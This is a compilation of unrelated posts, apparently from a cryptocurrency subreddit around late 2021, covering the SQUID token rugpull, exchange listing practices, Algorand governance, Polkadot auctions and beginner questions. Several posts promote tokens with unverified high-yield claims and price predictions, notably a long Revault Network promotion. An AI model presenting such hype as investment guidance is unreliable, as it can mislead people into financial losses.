If you scroll trough their new listings it is full of scams, honeypots and certain rugpulls and they just keep listing them without decent research. Look at the SQUID fiasco. They list the coin, and what now we get messages from people that the coin is not sellable. Lets put a disclaimer at the top of the coin information instead of hiding it from millions of people. With the amount of users cmc has and the knowledge that alot of people have no idea how to DYOR they should be more cautious about what they make available for the people to see.

Coins like SQUID could be marked as a scam after an hour of research by people who can interpret smart contracts and how they work. Instead of doing that they just list shitcoins for everybody to see and have a possible 1000x on this new coin with a low market cap.

It is owned by binance and i can't imagine them not having enough funds to hire people capable enough to see trough this shit.

Alot of money could be saved if they would act more responsible about their listing process.

I watched mark from facebooks videos on his VR world and played the decentraland and Im big on disruptive technologies, I feel as if the whole issue with it is who is promoting them and how they are getting promoted. Mark doesnt make for a great spokesperson in my opinion because he has such a polarizing persona but that being said he still is a leader in disruptive technologies and large owner of one of the worlds biggest social media. As far as it goes what will these government people not get their hands around fast enough to control ever little aspect in our real and digital lives. Seems a little rediculous but idk money is what beats everyone up and the crypto use to be not controlled and was decentralized, it was for the people still a little bit of gray area left on this topic but seems disruptive to me.

So we are all well aware of Squidgame rugpull that just occurred. My question to the community is. How close did you come to the actual rug, but sold in the hours or days before? What was it called? How long did you hold it for? Did you suspect the rug and just try to make a quick dollar? Were there warning signs? Why did you sell?

This is not only an opportunity to tell your story but also give some advice to those newer to the crypto environment as well.l what to watch out for. 

-- ignore this part 500 is where we got to get to and I don't want to sound too repetitive with questions --

I have decided to make a new series on this subreddit called **"Discovering new Altcoins with great potential".**

I believe that we are entering a new and exciting stage in the cryoptospace with more and more DeFi projects entering the stage that have some very interesting use cases and solutions that are a great fit going forward.

I'd like to start this first session with a coin that I discovered last month, and I believe that it's a great promising project that has the potential to evolve into a network that will be used by many newcomers that want to stake their assets with some great APR rates.

**Introducing Revault Network!**

# WHAT IS REVAULT NETWORK

Revault is the first and only Layer 4 project out there at the moment. Yes, you heard it right, Layer 4!

The main solution and proposition is to bring easy navigation into the ever growing DeFi space, and  to become the Google of the DeFi ecosystem, by enabling everyone to easily find and deposit their funds into the best performing vaults that are currently available.

Revault Network did that simply by creating a gateway to DeFi returns and services. Using Revault you can search and find the best vaults for staking your favorite coins.

The team behind this project solves two key challenges: First finding the best place to invest or stake you assets (with risk evaluation) and second, always maintaining your position optimal, ensuring you as a user to get the best possible APR's and APY's at any given moment together with a detailed risk evaluation.

In simple and plain words - **Revault is searching the entire DeFi ecosystem for the best staking and farming rewards for your assets.**

Sounds cool isn't it?

# LAYER 4 EXPLAINED

Revault has categorized DeFi into 3 layers:

* Borrowing and Lending
* Farming
* Vaults

**The fourth layer is the Revault Layer, this layer is a vault aggregator and its designed to bring  the best performing vaults in the DeFi space for your assets at any given time! It's also rebalancing these positions whenever a new vault is taking the lead giving you the option to switch to a better performing vault at any given moment.** 

In order to give you an idea how this looks like, here is a very interesting visualization:

[Layer 4 ](https://preview.redd.it/ptg4zftt9zw71.png?width=1621&amp;format=png&amp;auto=webp&amp;s=f73143452ba60aeecae0e7ed2dd89abdbfbd8a18)

# HOW DOES IT WORK?

It is very easy to use. I have already used it to stake their native token REVA into this, and I am currently staking it with a 344% APR for 30days of staking! Although, as adoption grows, this percentage will drop, but if you are early, you can definitely expect some serious rewards with staking.

Staking is very easy, all you have to do is to connect either your Metamask wallet to their app, which you can find on the top menu on their [website](https://www.revault.network/).

Once there, you will have some options to stake. Please take in consideration that this is still in BETA and the team wants to ensure that they fixed all bugs and glitches before going live. Here is a [video guide](https://www.youtube.com/watch?v=yMG7XXPOrjE)

At the moment you have these vaults available:

[Available Vaults](https://preview.redd.it/lwz24q5w9zw71.png?width=1071&amp;format=png&amp;auto=webp&amp;s=99d35090fb42e7f39163a9cd90248e168d3375c3)

# TOKENOMICS - REVA TOKEN

REVA is a native BSC token with a max supply of 18,181,818 tokens, and no more than this amount of tokens will ever be minted.

Here is a visualization of the total token allocation:

[Reva Token Allocation](https://preview.redd.it/urlc6qhy9zw71.png?width=757&amp;format=png&amp;auto=webp&amp;s=97fb3a5c3362313b01581c28bd298fc4d26a90a0)

All Pre-sale and ILO contributions will serve as liquidity for the REVA-BNB pool and they will be locked for 2 years. This will be sent to the Revaults treasury, which is governed by the Revault DAO. 

The staking rewards are amazing, as already mentioned. There are currently four different staking options available:

* **Bronze** with No lock - at the moment 253.05% REVA APR
* **Silver** \-with a 7 days lock - at the moment 310.48% REVA APR
* **Gold** \- with a 30 days lock - at the moment 344.25% REVA APR
* **Premium** \- with a 90 days lock - at the moment 402.17% REVA APR

There are also some taxes in place, here is a explanation of them:

* Once you decide to withdraw, there is a 1% tax that is redistributed to all REVA stakers.
* Every time a user decides to withdraw its position, 30% of its profits will be converted to REVA before it can be sent to the wallet.

All REVA transactions have a 0.25% tax as well and they are redistributed as following:

* 25% of them will be burned
* 25% are sent to the Revault treasury (which is held by DAO)
* 25% will be distributed between all current stakers
* 25% will be distributed between all the REVA-BNB liquidity providers

I would highly recommend to check their tokenomics in more detail using this [article](https://revaultnetwork.medium.com/revaults-token-economics-e9bef267d9d2)

# THE TEAM

One thing that is crucial for me, once I discover a new project is the Team. I have a simple method for this, if a project doesn't have a clear and visible team listed on the website, I am not investing or researching it anymore.

It is very important that new projects are transparent and that we have the chance to check them out and discover what their expertise are.

In this case, we have a highly talented team behind this project. The majority of them are some key developers and ambassadors of the more popular project called [Orbs](https://www.orbs.com/) with the Orbs co-founder o Uriel Peled taking the lead in Revault.

Here are some information about them over Linkedin:

1. [**Uriel Peled**](https://www.linkedin.com/in/uriel-peled-61073b29/) **- Co-Founder of Orbs, Hexa Labs and Visualead (purchased by Alibaba)**
2. [**Ohad Galor Kimchi**](https://www.linkedin.com/in/ohad-galor-kimchi-6b2433a3/) **-** Chief Architect and Product
3. [**David Benchimol**](https://www.linkedin.com/in/david-benchimol/) **-** Software &amp; Smart Contract developer

# ROADMAP

One of the bullish news that was highlighted in October was the Revault Incubation by the well-known Binance [Defi.org](https://Defi.org) project, and looking at this, we can see that there is a high interest by Binance to back this project and provide them the necessary resources to grow!

Revault Network has listed its roadmap on their [website](https://www.revault.network/). One of the key highlights are the following:

[Revault Network Roadmap](https://preview.redd.it/33ho88odazw71.png?width=1204&amp;format=png&amp;auto=webp&amp;s=a1745328fff17e57bf3a96f2e51ed15a91a8bab7)

# FINAL THOUGHTS

I have stumbled upon this project by chance and since then I couldn't stop researching about it. This is still a very fresh project that is still in BETA, but despite all this, we can already see and experience the user friendly interface as its very easy to use, which is a big plus for mass adoption, especially for newcomers.

This layer 4 solution, is a one of a kind, and I am sure that there will be new projects that will implement this same concept because it just had all the ingredients to make it a very successful idea.

You can farm and stake your assets easily, deposit and withdraw your assets to your wallet with only a couple of clicks, and I think that this is one amazing feature that has a bright future. I am sure that more and more users will be and is already interested in finding a platform where they can easily track and stake their assets.

The only thing that is currently missing is a larger community, and there are no clear guidelines and timelines for some marketing campaigns that will drive this project further. Marketing is right now my only concern, as we still need to see how this team plans to promote this project in a rapidly growing cryptospace.

This is definitely a project to watch during the next year, and if they can execute a good marketing strategy in the next 6-12 months, I am quite sure that this project will reach a Top 200 spot by marketcap by end of 2022, or even a spot into TOP 100 if they manage to get listed to one of the Tier one exchanges out there.

***Disclaimer: This is not financial advice. This is pure research, and I want to share some of my findings that I have discovered in the recent months and weeks.***

If you find this kind of post, let me know. I don't want to "shill" projects, I only want to share some info about new projects that are out there and share with this community my findings.

If you have any suggestions about new projects, feel free to comment. I would love to hear your opinion about Revault as well!

Thank you and wish you all a great day ahead.

I'm not really that knowledgeable when it comes to the application of block-chain, but I understand the general inner workings to a very crude degree.

I was thinking it would be nice if we used block-chain to register every cent of tax money coming in and going out. Where it was received from and what it was spent on - basically providing transparency to what actually happens to money once it reaches government. We could at least decrease corruption that way. Government would probably support that "if they have nothing to hide" - which is an argument they, use on us all the time. 

I'm pretty sure it would be possible, but I don't know how it would work exactly - but there are far smarter/more knowledgeable people on this sub who might have some ideas.

Making a short list of tools &amp; functionality I think would help crypto gain adoption/ improve user experience... Here's what I'm still looking for but can't find:

* Tool to sign/ implement a transaction when gas fees go below certain threshhold. Ideal for things like restaking staked rewards (where token price fluctuations do not matter). 
* Dashboard that shows balance/ activity over time. Coinbase has this for funds held on CB, but CoinbasePro does not. (Why??) [Zapper.fi](https://Zapper.fi) shows a lot of DeFi balances, but not staked rewards, and their NFT value calcs are far from perfect. [Apy.vision](https://Apy.vision) shows LP positions and includes info on impermanent loss, but does not have functionality of [Zapper.fi](https://Zapper.fi) otherwise.
* CoinbasePro defaulting to Litecoin when you go to trade. ?! CoinbasePro not allowing you to set/ drag drop defaults for which coins you want to see prices for - instead requiring scrolling up and down to find coin prices. CBPro also not allowing you to view long term price action data.
* Comments within [etherscan.io](https://etherscan.io). Really wish the comments sections were better utilized by devs to offer info about the projects. 
* Social media for NFT's. Discord/ Telegran are OK - but sometimes you want to message someone who holds an NFT to negotiate a bid/offer and there's no easy easy way to do this. 
* Easy way to include messages within ETH transactions. I know this is possible, but it's not easy/ intuitive.
* Better cold wallet functionality. The number of times I've seen frustrating tweets/ posts/ comments about someone trying to mint/ transfer/ buy while using a Ledger/ Trezor. 
* what else??

Just like with Kusama- DOT parachain auctions are coming to Kraken. One of the most supremely bullish things happening to a still undervalued coin- I'm very excited to see how this is going to unfold. And you only need 5 DOT to get started. If you've been following Kusama's parachain auctions, you'd know why this is going to get the bull charging for DOT.

&amp;#x200B;

The real questions tho - are you going to keep part of your DOT staked for the great APY, or are you going all in on parachain auctions? Which project are you getting behind?

&amp;#x200B;

Current list of projects up for the auction: 

1) Acala (ACA)

2) Centrifuge (CFG)

3) Astar (ASTR)

4) HydraDX (HDX)

5) Bifrost (BNC)

6) Moonbeam (GLMR)

 A week ago I was talking to my friend about crypto and the conversation went like this:  


MF: Have you invested in Squid game token?  


Me: What? I didn't know they have a token? Is it legit?  


MF: Totally legit bro. Read the fucking Whitepaper.  


Me: Where? How do I read it?  


MF: Let me show you bro. See. This is the Whitepaper.   


Me: I can't read bro. I'm trying my best but guess I'm not good at it.  


MF: No problem bro. I'll read it for you. It says Lambo is nigh  


Me: OMG. I think I shouldn't miss out on this one  


MF: Yeah keep the Whitepaper and who knows maybe you learn to read in a week or two  


Me: Yeah thanks let me dump my life savings in this real quick  


A week passed and now looking at my squid game holdings and the Whitepaper at the same time. I think they have a very strong resemblance. I finally learned to read the white paper 

&amp;#x200B;

&amp;#x200B;

[Whitepaper](https://preview.redd.it/3n29pa20azw71.jpg?width=1000&amp;format=pjpg&amp;auto=webp&amp;s=ff54c0409ac36fb089be73e72fcbddd610d88078)

I cant be the only one with this conflict. Weve been together almost 3 years. Right before we met, I made a decent investment into crypto. By now, Ive made good money, but its not like Im rich or anywhere close. I really just want to keep holding and going to work every day as usual. 

The reason why I havent told her; she is the arbiter of paychecks. Her financial responsibility is similar to if you handed a 9 year old your life savings and sent them into Toys R Us unattended. Money spending and savings is just about the only issue of contention between us. If I showed her the account, Im afraid of the conversation that would follow. 

I have to tell her some day, I know. Personally, I dont think the day is quite near. We might fumble through another crypto crash, but I believe the market has a lot of growing to do. The longer I wait, the more awkward its going to be when I finally tell her, but, the larger the account. 

I dont want to start spending all of this money, but I also dont want to feel like a liar to the woman Ive been with. I have one friend Ive told this to. He asks if I even love her, and of course I do. 

Were you in my shoes, what would you do?

Think about it, it was heavily discussed in mainstream media. After it was immediately discovered as a scam in social media, mainstream never bothered to make a correction. I reckon some politician will make a proposal to regulate crypto again and will reference what happened to SQUID and say its needed to protect you and me.

Im just typing a few more words to meet the minimum character count. I hope this is enough. Let me do that again. Typing more and more words to meet the minimum character count of this subreddit.

If any active crypto developers could help me out by answering a few questions that'd be great. I really want to work in crypto but I'm unsure what I need to do?

Bit about me,

I have a years experience as a Data Scientist writing **Python**, and a **Maths Degree**. Tbh thats about all the related experience I have at the moment. Ive also done some modelling of weather for the **MET Office in R**. I don't believe any of these languages are used in the crypto space right?

&amp;#x200B;

**What's the job market for Crypto Developers?**

Currently the Data Scientist job market seems to be happy to take on people with very little experience and still put them in positions of pretty huge responsibility. Is this the same for crypto or is it very much a senior developer only kinda space? How easy is it to get an entry level developer position and would you actually get to contribute or is it a "you-make-the-tea" kinda role?

&amp;#x200B;

**What Language should I learn, are jobs happy to let you learn the language on the job or not?**

I learnt python on the job, (don't really think that's a normal arrangement. But because I had a math's degree and had done some stuff in R for the MET Office they were happy to take me on when I didn't know python) is this something I could expect from the crypto space when it comes down to learning Plutus or Solidity

&amp;#x200B;

**Is it incredibly stressful?**

First mover advantage seems insane in the crypto space, does this lead to massive pressure to do stuff quickly and rush products out?

&amp;#x200B;

Sorry if the post seems under researched but I've just been screamed at by my Boss for not completing a deadline that was impossible to complete anyway (tried my best, put in 20 hours of overtime over the course of the week, just was unreasonable and I let him know that at the beginning) and so am in they very early stages of looking at crypto careers.

First of all you need to decide why you hate meme coins to understand why theyre useful.  I see a lot of people getting angry/upset at how many people are buying them, gaining from them, shilling them etc.
Why are you feeling upset about that ? From the general feel of most posts and comments and my own personal opinions, they normally offer no utility, normally centralised, makes their creators incredibly rich and takes attention away from solid projects.  Basically theyre as close to a Ponzi scheme as can be.

Now if this summaries your feelings here why these pumps are good, these meme coins will eventually confirm or deny the value youve assigned to the characteristics of the crypto you have invested in. Whether its fair distribution, use case, decentralisation, energy consumption, concencus method. The reason you have chosen the cryptocurrencies youve chosen is because youve assigned a value to each of its unique characteristics and traded it off against the price.  For example you value decentralisation for a reason, the market will eventually confirm this, as the problems with centralisation will plague the coins that arent decentralised and burn anyone that didnt value it. Thus educating them and you in the process.

The market will eventually confirm your value hierarchy whether it be through rug pulls, lack of real adoption through no use case, poor tokenomics causing problems.  Its literally just a waiting game.  So whilst it may be annoying or frustrating to you now in the next 10 years it will allow the space to learn, grow and strengthen from what weve learnt as a result of failed coins.

Make an educated investment decision, Invest in what you believe in and wait to be proven correct or learn from projects that have succeeded.

Until then sit back and enjoy the ride. Good luck.

Whats your strategy in trading for crypto? Like when you buy a coin do you wait for a target and sell everything or sell the initial investment and leave the profit, or do you just invest money in different coins and leave them there?

For example i invested 10-20 dollars on many coins that have future projects especially with metaverse now. And i had my biggest investment on Bitcoin-Etherium-XRP, and when for example my initial investment in Ankr doubled from 24 dollars to 46 i took away the initial 24 and left the profits there and wont sell them. Is this the right method of investing in crypto in your opinion?

Dear hodlers and crypto geeks.

My partner and I are looking into a beginning a startup psychology company by beginning with a research application where we can see what people need and want to work on (habits, meditation, mentalisation sleeping, psychotherapy and much more). 

However, many of these people are suffering from many abnormalities and one big part in many third-world countries, its shame, and not being exposed. Therefore I thought by creating a token could help them start their journey with us by coving their identity when needing to pay (mostly thats the idea). But also if they want to donate in order for us to help the little guy. 

What do you believe we should keep in mind when creating the token, and how else could that benefit the people in need of psychological therapy via the application or therapy in person. 

P.S please keep in mind we are just to broke master graduates who we want to start our career by helping the little guy. 

Thank you for any short of assistance.

I saw in post here a few days ago an idea of rival coins. I thought it was a good idea. A few hours and a couple thousand dollars in eth fees later, [DayManToken](https://etherscan.io/address/0x4315DA614feBD213ecBF7B313867eE74979CB380) and [NightManToken](https://etherscan.io/address/0x99F4C102041779Ca64132d3D2e64172eb5584ADF) are created. The tokens have identical properties that mirror each other. People can mint new tokens from either contract by depositing eth up until the total combined supply of both tokens reaches 10,000,000. The supply starts at zero, meaning that I had to buy in with the same price. Whenever a transaction is made on one token, 1% of the transaction is burned as a troll toll, and the corresponding amount of eth is sent to the other tokens contract. This increases the relative value of the token with the most diamond hands behind it. The burning of tokens opens up a minting opportunity, but the cost of minting new tokens is proportional to the total amount of burned tokens. [Here is the code that makes it work](https://github.com/Codys12/NightmanCometh). The code is also listed on etherscan. You may be wondering why a broke college student would risk so much money on eth fees to make a meme coin?

Curious, as to what everyone would do?  

You find a phrase in an old book.  You use the phrase to recover a wallet, and there it is, retirement money sitting in front of you.

Whats your next move?
Finders keepers?

Is it technically illegal to move it to another wallet, or is it tough luck on whoever misplaced their phrase?

#Not your keys not your coins

Many of us read this words, but dont understand what it really means.

When you are leaving your coins on exchange it means you down own the coins, they own the coins and they owes you its value, so if any thing happen to this exchange you cant get this coins 

Do you know guys how many exchange got hacked before and people lost their coins? Do some search and you will find that happened to many famous exchanges

Do you remember last month when Binance didnt allow withdraw before ALGO governance?

And last news today after Binance suspend all crypto withdrawals, isnt it time for you to move your coins to your own wallet?

If your answer on this topic that withdrawals are back or you dont use Binance, so you didnt get any thing from this topic and sorry for disturbing.

What is your move guys? Are you keeping your coins on exchanges?

It's time to decisively settle one of the hottest matchups on this sub. Who wins? Technology or money? Lambos or progress? Or both?

There have been many discussions on here between hardcore tech enthusiasts and people just trying to make a buck. The two groups mostly respect each other, but there's understandable friction due to the very different motivation behind their purchases. Personally, I think both mindsets are valid, although I lean toward "mostly money".

Hello guys and gals, its me u/qqwe22 and I am here with another question for you stakers, hodlers and traders! 

What was the quickest rugpull ever created???

Does not matter if it was a standalone coin, ethereum based token, binance ~~scam~~ smart chain token, harmony one token or whatever token! What matters is that the coin was a rugpull and it went down very fast.

I am very, like very curious about your opinions so please put your thoughts in the comment section down below!!! I WILL READ ANY AND EVERY comment you post here because I like your opinions.

Lets go!!!

I'm not endorsing regulation in a way that affects decentralization, but I do want to point out the cons of decentralization as many oftern over look that.

The squid game is an obvious meme trash coin that doesn't have any fundamentals like most coins in BSC network. The only reason people bought it is because they wanted to make money.

In a regulated market this wouldn't be the case, even if a coin was decentralized someone was responsible for the assets being bought and sold. 

PancakeSwap couldn't delist the token because of the centralized nature of Dex. That doesn't make Dex inheritanaly a bad thing.

Dex is as bad of a thing as the internet, but unlike the internet people underestimate the security and chances of losing money in Dexes.

Pro tip: Always assume 99% of the coins are scams, you have to find reason to prove otherwise before investing.

Hi everyone. Asking this question because it could help many others like myself.

I have only ever bought cryptos on Coinbase and Etoro(yeah, I know).

Just recently I've noticed that a lot of these projects have traded at fractions of pennies not long ago, before they were listed on coinbase or binance.

I am having a hard time figuring out where and how to buy projects early. I understand that with crypto it's not as easy as just entering card details and buying, so I am trying to familiarize myself with meta mask and pancakeswap, but even then, I am having a hard time finding ways to buy new projects.

Seems that in this space you have to constantly research 24/7 to be able to spot something worthwhile, and then spend two days figuring out how to actually buy/invest!

Does anybody get what I'm talking about or am I just crazy? Thanks for the feedback in advance!

With the polkadot parachains right around the corner whats everyone looking at:

Acala (ACA)
Centrifuge (CFG)
Astar (ASTR)
HydraDX (HDX)
Bifrost (BNC)
Moonbeam (GLMR)

Ive not dont an auction before but Im very keen to get involved in pretty much anything polkadot does. 

Im a bit unclear how it definitively works, I understand that you essential lock in a vote for the parachain but I dont understand the conditions surrounding a win. 

Any, more knowledge, people around to shed some light on the whole topic for my benefit and anyone else that is interested. 

Many thanks.

Bitcoin and other major cryptocurrencies are likely to jump this week on central banks interest rates announcements, predicts Nuggy.

The prediction from Chicky, the game-changing CEO and founder of this reddit account, comes as the U.S. Federal Reserve, the Bank of England, the Central Bank of Norway, and the Reserve Bank of Australia, are all reviewing interest rate policy this week.

Mr Nuggy says: Market watcherswill be all eyes on central banks as they look for further hints on asset-buying tapering as global inflation ramps up.

The Fed is expected to announce a taper, the Bank of England an interest rate rise, Norway likely to hint aboutits second-rate hike of the year, and the Reserve Bank of Australia could shift its guidance after last week letting its 3-year bond yield surge through the targeted 0.1%.

Nug continues: Theres a growing consensus that were going to get tightening a lot quicker than markets had previously anticipated.

This climate will boost Bitcoin and other cryptocurrencies as with their provable limited supply cap, they are an intrinsically deflationary asset class.

The mounting concerns over inflation causing Bitcoin to appear more attractive as a hedge, also comes at the time as inflows from institutional investors continue to increase - bringing with them capital and expertise - and as providers continue to meet ongoing demand with new Bitcoin-related investment products.

Mr Nuggy adds: In addition, the U.S. Federal Reserve saying it has no intention of banning cryptocurrencies is not going unnoticed by both retail and institutional investors.

That said, its highly probable that other cryptocurrencies will have more stringent regulatory oversight, yet Bitcoin could be viewed differently by authorities partly due to its gold-like status.

In July, the Nugget successfully predicted that Bitcoin would hit fresh all-time highs this year, which came to pass last month. He has also said that should the current conditions be maintained, additional new highs could be reached before the end of 2021.

He concludes: Crypto investors will be eyeing the central banks this week amid a flurry of interest rate reviews. Prices can be expected to be positively impacted as Bitcoin and others are increasingly regarded as a hedge against inflationary pressures.

This is a huge thing for all the Algonauts out there, and I am bullish for a few reasons:

**1. The Staking** 
Rewards are just so good on their own, but with added governance rewards, the governors get an even better reward, simply for participating in the community! That is a huge W!

**2. The Timing**
Governance was laid out to happen after a certain number of ALGO had already been distributed through staking, and lo and behold we hit that number *years* early! Thats because the adoption was faster and larger than initially anticipated! Bullish!!!

**3. The Voting**
They say voting gives a voice to the voiceless, and with the governance system, you can commit under 10 ALGO and still cast a vote on the issues that will impact the coin moving forward. Giving everyone a voice is true decentralization, and thats a necessity for the long term success of a coin.

**The Point**
If you are a governor this quarter, dont forget to vote! If you arent! Buy some ALGO and commit to the next quarter when the window opens up. Already the first vote is about a huge distribution decision, and its great that the community gets to decide.

Back when DOGE had so many zeros it was a laughable, I used to use it to transfer between exchanges. I'd always be sure to clear out every last DOGE, to make sure I wasn't wasting any money. The reality was, "wasting" money would've been one of the best decisions I could've made.

If I had left just a few dollars of all the crypto I was transferring around each time, whether it was Bitcoin, or ETH, or DOGE, or XRB (RaiBlocks which became Nano), I would've made significant amounts of money.

So before you make sure not to "waste" any money and clear out your wallet completely, just leave a little bit behind. You never know when that $1 you left behind is going to 20,000x and become the next big thing.

Remember to vote in the Algorand Community Governance poll.

The Algorand Community Governance poll is very close at the moment.  It is sitting at about 49% for A and 51% for B.

A is for keeping the current system of reward distribution and B proposes slashing by 8% the commited algo of those who don't fulfill their commitments to fund greater rewards.

I personally voted for A as I don't like the idea of having your algo slashed due to some mistake or other, maybe wait a bit until the system is settled in.

Get your votes in if you have commited algo, you can vote through the govenance page.

Best wishes, H.T.

With the last week dog meme coins invasion and the recent Squid Game scam i think that we can very well describe the world of Crypto with a character from a game called Changed.

The name is Squid Dog, he is described as: " *The* ***squid dog*** *is a large four-armed light latex squid-dog creature, having the facial features of a dog and the limbs of a squid that it uses in an attempt to transfur the* [*Human*](https://changed.fandom.com/wiki/Human)*.* "

**Honestly, this Squid Dog looks very much like the last week in Crypto, very messy and awkward.** Take a look and more info here:

I've recently bought a meme coin . Seeing all the meme coins pump I've realized this year will be the meme season.

I did not wanna miss out on the gains , so I said fuck it , I only live once. I ignored Shiba and doge as I feel I have missed their trains.

I was scared I might pick a coin that would fall or get rug pulled or not make me any profit at all. To my wonder I happen to select a coin which made me good profit in a matter of hours .

After a tremendous gain it is now beginning to fall, I was wondering If any expert in technical analysis could help me figure out if it would go up or keep falling?

Is it rising wedge or falling wedge?

Perhaps a cup handle or any other handle?

I've Put the chart here for reference

Another top post right now claims it's a "lifehack" to sell your bitcoin or ether into something like xlm or nano to transfer between exchanges. This is a horrible idea. 

So you're saving at max a $25 transfer fee. (Note many exchanges like Gemini give you several free transfers or are way cheaper) 

Let's look at your downsides.

First, you're likely paying a trading fee on both sides. If you're under $10k you're looking at a total fee of about 1% plus spread on your two trades. Don't under estimate the spread, it alone can be 1% on each trade. Many "free" trading platforms secretly are profiting from the spread. 

Second, most of us are in jurisdictions that tax crypto to crypto trades. Most of us are in a gain position. Selling btc to nano is taxable and at a min will generate a 15% tax on your gains. Your also creating a nightmare of transactions for your tax return. Most tax software charges based on transaction volume. 

Finally, your also introducing the volitility of your transfer coin into your investment. Many people will panic sell fast to get their intended coin back. Just like day trading, most here will lose and end up with significantly less of their intended coin. 

In summary, as TLC said, don't go chasing waterfalls

It happend! Even though coinmarketcap had so many warnings for this token the scam took place.

After SQUID hitting $2,861.80 it went to $0.0007926 within minutes. Even though other people couldnt cash out the developers are gone with millions.

Everyone be cautious when buying coins on pancakeswaps or other exchanges like this. Anyone can make a coin like that within minutes. Yes FOMO is there when you see people making 1 million from 1000$, but there are way more rug pulls then you think.

What do you guys think about this ?

[Context:](https://i.imgur.com/6WoLMYE.jpg) one of those random likable meme Facebook pages from 2010 is leveraging all those stupid likes from a decade ago into passing itself off as a legit DeFi advice page. Probably going to be used for pump and dumps in the future. This post is partially to call them out, partially to remind everyone here to be careful and remember that just because a page has a lot of subscribers/followers/liners/whatever doesnt mean it gives out good advice, manipulation like this is crazy easy

I have some BTC and ETH on PayPal. I only bought using PayPal because my bank has horrible integration support and wasn't approving any transfers to exchanges. Now I finally have an account with BlockFi and want to move some of the crypto over there for the interest accounts, but would rather not have to pay taxes. In case you don't know, I can't just send the crypto from PayPal to my BlockFi wallet, since PayPal doesn't give you an actual wallet. It's like how Robinhood crypto works. 

So my plan to avoid taxes was to only sell amounts equivalent in USD to my initial investments, and keep the profits in my PayPal account. As an example (using round numbers) let's say I bought 1 BTC for 10k, and now I sell 0.5 BTC for 10k, would that be a taxable event? Any help in improving my understanding is appreciated. Thanks.

Still remembers back then in 2018 when I was watching television in my house and advertisement appeared on my screen educating and enlightening people about cryptocurrency, then I wasn't interested in cryptocurrency at all lol 
I was watching the ads but decided to change my station to a basketball match which I picked interested in and started enjoying the match.
After the day I was at work when a colleague of mine made mention about crypto, then I have already seen it on my television so I decided to pay attention to what he was saying, he was talking exactly what I watched on my television the other day, from that moment I started thinking about it on how am going to invest in cryptocurrency, Later run around the month of August 2018 I made my first investment in bitcoin which later pump as of then and that's how I started investing in cryptocurrency coins it was somehow complicated for me then except after my friend explained what cryptocurrency about to me lol.
Even if you're still new in cryptocurrency it doesn't matter, you can still start up any day and make profits, if you're lucky maybe the coin you will buy might pump and that's how your life will change like mine. 
Feel free to express yourself even if you're new to crypto
Your expression brings ideas for you, Thanks.

Buy a bunch of coins that recently just got in the market and sell them when you make a profit or when the price falls you hold it till you see it in the green, I think that using 10 to 100$ is efficient.

 I saw how some new crypto on Coinmarketcap.com went up to 100% and more in less than 14 hours. I'm not too sure in their reliability so I think that getting in at it's cheapest when it's when they just come out, and sell it within the same day would be a safe strategy.
What do you guys think? Did any of you try this before? If you did how did it turn out for you?

Ive been in and out of crypto for 4 years now. Finally holding on for the long term (holding LINK, LTO, VET, COTI and ADA). But every time a coin underperforms for a few months, and I see other coins sky rocket and gain traction on social media, I  always feel like jumping ship. Is this a good idea? As an example I had been holding SNX for months (got in at $10 and then bought again at $12) but I sold to buy more VET after seeing everyone on here and YouTube talk it up. Ive done this several times in the past and its burnt me some and won on others. Am I doing the right thing by moving into more popular coins or or should I just keep holding on to it for the long run with the risk of missing out on other great projects? Anyone else feel this dilemma?

I know a lot of people here really hate Binance, not sure why but it is easily my favorite exchange and I'm going to give you the reasons why:  

-Their P2P is a godsend, send any crypto instantly and feeless to another Binance user, makes it easy to buy or sell crypto with local currency for people like me who lives in countries where you can't get debit or credit cards for international use!  
-Easy of use and it just looks great  
-they do research before listing  and try to only list good projects (a few exceptions i know)  
-In some countries you can use their Binance Visa Card to expend your crypto, i heard it works great!  
-Their trading fees are minimal 0.1% and could get as low as 0.04% if you're a whale  
-You get some nice staking options with nice apy  
-they do have support, and are easily reachable  
-Easy access to The Binance smart chain for those of you who are feeling kinda risky, you even get 0 fees if you are using Busd!  

These just from the top of my mind, so if you have another pros or cons feel free to add them :)

What are your favourite Layer 0 projects at the moment (and why), and do you think there's a need for more than 1 decent Layer 0 in the crypto space? 

I think my portfolio is lacking in this area, and I'm currently researching it, but would be interested to see what other people's thoughts / picks are, so I can look into those more in-depth for myself.

I don't see a great deal of benefit to there being a number of Layer 0 projects, though this may just reflect the gaps in my own knowledge.

Appreciate the insight

The metaverse may eventually come to define how we [work](https://doi.org/10.5210/spir.v2021i0.12152), [learn](https://doi.org/10.1177%2F14614448211012794) and [socialise](https://doi.org/10.1177%2F1461444820960411). This means VR and AR would move beyond their current niche uses, and become everyday technologies on which we will all depend.

We can guess at Facebooks vision for the metaverse by looking to its existing approach to social media. It has moulded our online lives into a gigantic revenue stream based on [power, control and surveillance](https://www.theatlantic.com/technology/archive/2021/10/facebook-metaverse-name-change/620449/), fuelled by our data.

VR and AR headsets [collect enormous amounts of data](https://doi.org/10.1177%2F14614448211012794) about the user and their environment. This is one of the key [ethical issues](http://dx.doi.org/10.25910/5ee2f9608ec4d) around these emerging technologies, and presumably one of the [chief attractions for Facebook](https://theconversation.com/facebooks-virtual-reality-push-is-about-data-not-gaming-145730) in owning and developing them.

What makes this particularly concerning is that the way you move your body is so unique that VR data can be used to identify you, [rather like a fingerprint](https://dl.acm.org/doi/abs/10.1145/3290605.3300340?casa_token=fc-88W18qx8AAAAA:9KjO8k2pQJbINf4FK-y1_W2o9tY6Uwduhfbis95Zyl9VBd76BadqVrJU-qLP61wJS4o9f_kpdfvhzA). That means everything you do in VR could potentially be traced back to your individual identity. For Facebook  a digital advertising empire built on tracking our data  its a tantalizing prospect.

Not sure if the correct flair is comedy or drama, but I managed to make transaction that was 100% pure gas. So... the other day I got all excited about a coin someone shilled very well here (TAU) and decided I would get some. I am not that schooled in crypto and I assumed it would be a difficult dive into different blockchain, but hey, if I never do it I will never learn. 
On the TAU website they actually have a very detailed how-to, and the first step would be wrap ETH into WETH. I dont know exactly what that means but I assumed it would be a way of moving ETH within its own blockchain, maybe avoiding high gas fees. I wanted to wrap 0,004. Yes, Im currently broke, so I had all my attention on not paying high fees, and a total of $16,62 with fees included sounded fair to me.
I followed the next steps and got to show WETH on my wallet. 0,00 WETH, transaction complete, with ID and details: 
Value: 0,00 ETH / Gas: 16,62 
I guess was so worried about not paying high gas that I forgot to double-check the amount I was sending, which was none.

One of the biggest issues we all face is the Gas issue. Sometimes its sickening to see how expensive it is to send crypto on the Ethereum network.

I signed up to use the Loopring Smart Wallet, and it blows my mind how people are not using it.

